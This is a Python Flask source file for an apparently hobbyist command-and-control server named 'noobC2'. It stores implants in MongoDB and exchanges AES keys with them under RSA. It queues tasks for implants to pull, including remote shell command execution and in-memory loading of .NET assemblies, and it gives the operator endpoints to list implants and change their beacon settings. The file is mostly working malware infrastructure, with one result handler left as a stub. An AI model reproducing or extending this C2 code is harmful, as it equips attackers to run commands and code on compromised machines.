from flask_pymongo import PyMongo
from flask import Flask
from flask import request
from flask import Response
from AESProvider import AESProvider
from RSAProvider import RSAProvider
from Crypto.Random import get_random_bytes
import base64
import json
from AssemblyLoader import load_assembly_from_file
import random
import string


#docker run -p 27017:27017 mongo:latest

app = Flask(__name__)
app.config["MONGO_URI"] = "mongodb://localhost:27017/noobC2"
mongo = PyMongo(app)


############# APIS THE IMPLANT SPEAKS TO. I WILL HAVE TO SPLIT EVENTUALLY BUT TOO LAZY NOW ###################
@app.route("/keyExchange", methods=["POST"])
def key_exchange_setup():
    aesProvider = AESProvider(get_random_bytes(16))
    data = request.get_json()

    mongo.db.implants.insert({'name': data["name"], "aesKey":aesProvider.key, "tasks": [], "config": {"pullInterval": 5000,"communicationMethod": "HTTP"}})

    rsa = RSAProvider(base64.b64decode(data["payload"].encode("ascii")).decode('ascii'))
    encryptedKey = rsa.encrypt(aesProvider.key)

    return base64.b64encode(encryptedKey)

@app.route("/getConfig/<name>", methods=["GET"])
def get_config(name):
    implant = mongo.db.implants.find_one({"name": name})
    aesProvider = AESProvider(implant["aesKey"])
    return aesProvider.encrypt(json.dumps(implant["config"]))

@app.route("/getNextTask/<name>", methods=["GET"])
def get_next_task(name):
    implant = mongo.db.implants.find_one({"name": name})
    aesProvider = AESProvider(implant["aesKey"])


    #task = {"taskName": "cmdExecute", "payload" : "echo test > C:\\Users\\Samue\\Documents\\sharedVM\\wtf.txt", "result" :"pending"}
    # task = {"UUID":''.join(random.choice(string.ascii_lowercase) for i in range(10)),"taskName": "assemblyLoad", "payload": load_assembly_from_file("C:\\Users\\Samue\\source\\repos\\ConsoleApp2\\ConsoleApp2\\go.exe"),
    #         "result": "pending"}

    #implant["tasks"].append(json.dumps(task))
    try:
        implant["tasks"][0]
    except:
        return aesProvider.encrypt(json.dumps({"taskName": "nullTask", "payload" :""}))
    return aesProvider.encrypt(json.dumps(implant["tasks"][0]))

@app.route("/updateTaskResult", methods=["POST"])
def update_task_result():
    data = request.get_json()
    #CHange that where I create a new AES provider using the key retrieved from mongodb
    aesProvider = AESProvider(get_random_bytes(16))
    aesKey = mongo.db.implants.find_one({"name": data["name"]})
    #encryptedResponse = aesProvider.encrypt("decryptedString23")

    return "encryptedResponse"


############# APIS THE CLIENT SPEAKS TO. I WILL HAVE TO SPLIT EVENTUALLY BUT TOO LAZY NOW ###################

@app.route("/listImplants", methods=["GET"])
def list_implants():
    implants = list(mongo.db.implants.find({}))
    for implant in implants:
        del implant["_id"]
        del implant["aesKey"]
    return Response(json.dumps(implants), mimetype="application/json")

@app.route("/addTask/<name>", methods=["POST"])
def add_task(name):
    implant = mongo.db.implants.find_one({"name": name})
    data = request.get_json()
    payload = data["payload"]

    #This is bullshit...the client app should be the one loading the assembly bytes and just sending them but right now my client is postman so meh
    if data["taskName"] == "assemblyLoad":
        payload = load_assembly_from_file(data["payload"])

    task = {"UUID": ''.join(random.choice(string.ascii_lowercase) for i in range(10)), "taskName": data["taskName"],
            "payload": payload,
            "result": "pending"}

    implant["tasks"].append(task)
    mongo.db.implants.update_one({"name": name}, {"$set":implant})

    return Response(serializeImplant(implant), mimetype="application/json")

@app.route("/updateImplantConfig/<name>", methods=["POST"])
def update_implant_config(name):
    implant = mongo.db.implants.find_one({"name": name})
    config = request.get_json()
    if config["pullInterval"] is not None:
        implant["config"]["pullInterval"] = config["pullInterval"]
    if config["communicationMethod"] is not None:
        implant["config"]["communicationMethod"] = config["communicationMethod"]
    mongo.db.implants.update_one({"name": name}, {"$set": implant})
    return Response(serializeImplant(implant), mimetype="application/json")

def serializeImplant(implant):
    del implant["_id"]
    del implant["aesKey"]
    return json.dumps(implant)

app.run(host="localhost", port=443, ssl_context='adhoc')